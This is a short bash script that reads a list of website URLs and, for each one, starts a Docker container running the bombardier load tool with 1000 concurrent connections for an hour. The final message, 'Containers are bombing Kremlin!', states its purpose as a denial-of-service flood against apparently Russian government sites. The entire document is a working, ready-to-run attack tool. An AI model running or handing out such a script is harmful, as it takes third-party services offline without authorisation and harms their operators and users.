#!/bin/bash

input="websites.txt"
while IFS= read -r line
do
  name=`sed -E 's/^\s*.*:\/\///g' <<< $line`
  echo Starting $name container...
  docker run -dti --rm --name "$name" alpine/bombardier -c 1000 -d 3600s -l "$line"
done < "$input"

echo Containers are bombing Kremlin! Use docker commands to check how it goes.
